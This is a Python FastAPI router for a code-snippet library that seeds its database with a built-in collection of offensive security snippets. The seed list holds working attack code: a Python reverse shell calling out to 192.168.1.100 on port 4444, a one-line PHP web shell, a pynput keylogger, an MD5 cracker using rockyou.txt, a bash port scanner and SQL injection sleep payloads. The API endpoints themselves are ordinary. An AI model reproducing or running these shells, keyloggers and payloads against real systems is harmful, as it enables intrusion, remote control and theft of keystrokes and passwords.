from fastapi import APIRouter, Depends, HTTPException, Query
from sqlalchemy.orm import Session
from typing import List, Dict, Any
from backend.database import get_db
from backend.models.user import User
from backend.models.snippet import CodeSnippet
from backend.routers.auth import get_current_user

router = APIRouter(prefix="/api/snippets", tags=["snippets"])

SEED_SNIPPETS = [
    {"title": "Reverse Shell (Python)", "description": "Simple Python reverse shell with error handling", "language": "python",
     "code": "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('192.168.1.100',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])",
     "tags": ["shell", "reverse", "exploit"]},
    {"title": "Port Scanner (One-Liner)", "description": "Quick TCP port scanner using bash /dev/tcp", "language": "bash",
     "code": "for port in {1..1000}; do (echo >/dev/tcp/$1/$port) >/dev/null 2>&1 && echo \"Port $port open\"; done",
     "tags": ["port-scan", "bash", "network"]},
    {"title": "Simple Keylogger", "description": "Python keylogger using pynput library", "language": "python",
     "code": "from pynput.keyboard import Listener\ndef on_press(key):\n    with open('log.txt','a') as f:\n        f.write(f'{key}\\n')\nwith Listener(on_press=on_press) as listener:\n    listener.join()",
     "tags": ["keylogger", "python", "monitoring"]},
    {"title": "Nmap Subdomain Enumeration", "description": "Use Nmap NSE for subdomain discovery", "language": "bash",
     "code": "nmap --script dns-brute --script-args dns-brute.domain=example.com,dns-brute.threads=10 -sn",
     "tags": ["nmap", "dns", "subdomain"]},
    {"title": "SQLi Time-Based Detection", "description": "Python script to detect time-based SQL injection", "language": "python",
     "code": "import requests,time\nurl='http://target.com/page?id=1'\npayloads=[\"1' AND SLEEP(5)--\",\"1 AND SLEEP(5)\",\"1; WAITFOR DELAY '0:0:5'--\"]\nfor p in payloads:\n    start=time.time()\n    r=requests.get(url+p)\n    elapsed=time.time()-start\n    if elapsed>4: print(f'Vulnerable: {p}')",
     "tags": ["sqli", "python", "detection"]},
    {"title": "Wireless Deauth Detector", "description": "Monitor for deauth packets using scapy", "language": "python",
     "code": "from scapy.all import *\ndef sniff_deauth(pkt):\n    if pkt.haslayer(Dot11Deauth):\n        print(f'DEAUTH: {pkt.addr2} -> {pkt.addr1}')\nsniff(iface='wlan0mon', prn=sniff_deauth, store=0)",
     "tags": ["wireless", "scapy", "deauth"]},
    {"title": "PHP Web Shell", "description": "Minimal PHP web shell for file browsing", "language": "php",
     "code": "<?php system($_GET['cmd']); ?>",
     "tags": ["webshell", "php", "exploit"]},
    {"title": "Hash Cracker (Python)", "description": "Multi-threaded MD5/SHA1 hash cracker", "language": "python",
     "code": "import hashlib,threading\ntarget='5f4dcc3b5aa765d61d8327deb882cf99'\ndef check(word):\n    if hashlib.md5(word.encode()).hexdigest()==target:\n        print(f'Found: {word}')\nwith open('rockyou.txt','r',errors='ignore') as f:\n    for line in f:\n        threading.Thread(target=check,args=(line.strip(),)).start()",
     "tags": ["hash", "cracking", "password"]},
]

@router.get("/list")
async def list_snippets(current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    existing = db.query(CodeSnippet).count()
    if existing == 0:
        for s in SEED_SNIPPETS:
            db.add(CodeSnippet(user_id=current_user.id, **s))
        db.commit()

    snippets = db.query(CodeSnippet).filter(
        (CodeSnippet.user_id == current_user.id) | (CodeSnippet.is_public == True)
    ).order_by(CodeSnippet.created_at.desc()).all()

    return [{"id": s.id, "title": s.title, "description": s.description,
             "language": s.language, "tags": s.tags, "is_public": s.is_public} for s in snippets]

@router.get("/{snippet_id}")
async def get_snippet(snippet_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    snippet = db.query(CodeSnippet).filter(
        (CodeSnippet.id == snippet_id) & ((CodeSnippet.user_id == current_user.id) | (CodeSnippet.is_public == True))
    ).first()
    if not snippet:
        raise HTTPException(status_code=404, detail="Snippet not found")
    return {"id": snippet.id, "title": snippet.title, "description": snippet.description,
            "code": snippet.code, "language": snippet.language, "tags": snippet.tags}

@router.post("/add")
async def add_snippet(data: Dict[str, Any],
                      current_user: User = Depends(get_current_user),
                      db: Session = Depends(get_db)):
    snippet = CodeSnippet(
        user_id=current_user.id,
        title=data.get("title", "Untitled"),
        description=data.get("description", ""),
        code=data.get("code", ""),
        language=data.get("language", "python"),
        tags=data.get("tags", []),
        is_public=data.get("is_public", False),
    )
    db.add(snippet)
    db.commit()
    db.refresh(snippet)
    return {"status": "created", "id": snippet.id}

@router.delete("/{snippet_id}")
async def delete_snippet(snippet_id: int,
                         current_user: User = Depends(get_current_user),
                         db: Session = Depends(get_db)):
    snippet = db.query(CodeSnippet).filter(
        CodeSnippet.id == snippet_id,
        CodeSnippet.user_id == current_user.id
    ).first()
    if not snippet:
        raise HTTPException(status_code=404, detail="Snippet not found")
    db.delete(snippet)
    db.commit()
    return {"status": "deleted"}
